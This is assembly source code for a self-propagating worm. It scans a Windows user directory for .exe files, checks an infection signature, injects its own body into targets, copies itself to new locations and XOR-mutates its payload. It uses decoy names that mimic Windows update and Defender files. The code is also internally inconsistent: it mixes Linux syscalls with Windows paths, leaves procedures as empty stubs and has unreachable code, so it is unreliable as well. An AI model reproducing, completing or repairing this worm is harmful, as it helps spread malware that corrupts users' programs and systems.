section .data
    xor_key db 0x5A                     ; XOR key for encryption/decryption
    signature db "WORM_SIG"             ; Unique signature for infection check
    xor_keys db 0x5A, 0x3B, 0x7F, 0x2D, 0x4C, 0x6E  ; Extended key set
    cipher_matrix db 512 dup(0)                       ; Initialize with zeros
    decoy_strings db "windows_update.sys", 0, "defender_patch.dll", 0, "msvcrt_update.exe", 0, "chrome_helper.exe", 0
    valid_signatures db 512 dup(0)                    ; Initialize with zeros
    buffer resb 2048                    ; Buffer for file operations
    file_path dq 0                      ; File path pointer
    target_file_section dq 0            ; Target section pointer
    destination_path dq 0               ; Destination path for propagation
    mutation_buffer dq 0                ; Buffer for mutations
section .bss
    payload_size resq 1                 ; Size of worm payload
    infected_flag resb 1                ; Flag to avoid reinfection

section .text
    global _start

_start:
    ; Initial setup
    call get_payload_size
    call search_files_to_infect
    call self_propagation
    call mutate_payload
    jmp end_of_payload                  ; Jump to end marker

get_payload_size:
    ; Calculate the size of the worm payload
    lea rsi, [_start]
    lea rdi, [end_of_payload]
    sub rdi, rsi
    mov [payload_size], rdi
    ret

search_files_to_infect:
    ; Search for executable files
    mov rax, "C:\Users"                 ; Base directory
    push rax                           ; Save path for later
    call find_executable_files         ; Search recursively
    ret

find_executable_files:
    ; Check file extension
    mov rsi, [file_path]
    mov rcx, 4                         ; Length of extension (.exe)
    mov rdi, "exe."                    ; Extension to match
    std                               ; Search backwards
    repe cmpsb
    cld                               ; Reset direction flag
    jne .not_executable
    call check_infection_status
    ret

.not_executable:
    ret

open_file:                              
    ; Open file with read/write access
    mov rax, 2                         ; sys_open
    mov rsi, 2                         ; O_RDWR
    syscall
    test rax, rax                      ; Check for errors
    js .error
    ret
.error:
    xor rax, rax                       ; Return 0 on error
    ret    ; File opening logic here
    ret

random_transform:                       ; Added missing procedure
    ; Mutation logic here
    xor al, [xor_key]                  ; Simple XOR transform
    ret

    ; Embed worm payload
    call inject_payload

    check_infection_status:
        ; Check for worm signature
        mov rsi, [file_path]
        mov rdi, signature
        mov rcx, 8                  ; Length of signature
        repe cmpsb                  ; Compare bytes
        jne .not_infected
        
        ; File is already infected
        mov byte [infected_flag], 1
        ret
    
    .not_infected:
        ; File is clean
        mov byte [infected_flag], 0
        call infect_file
        ret
    
    skip_infection:
    ret

    infect_file:
        ; Open the target file
        mov rsi, [file_path]
        call open_file
        cmp byte [infected_flag], 1
        je .skip_infection
    
        ; Embed worm payload
        call inject_payload
        
        ; Mark as infected
        mov byte [infected_flag], 1
    
    .skip_infection:
        ret
    

inject_payload:
    ; Embed worm into target file
    lea rsi, [_start]
    mov rdi, [target_file_section]
    mov rcx, [payload_size]
    rep movsb
    ret

self_propagation:
    call enumerate_drives
    call copy_to_new_locations
    ret

enumerate_drives:
    ret

copy_to_new_locations:
    lea rsi, [_start]
    lea rdi, [destination_path]
    mov rcx, [payload_size]
    rep movsb
    ret

mutate_payload:
    lea rsi, [_start]
    mov rdi, [mutation_buffer]
    mov rcx, [payload_size]
.mutate_loop:
    lodsb
    call random_transform
    stosb
    loop .mutate_loop
    ret

end_of_payload:                         ; Added end marker

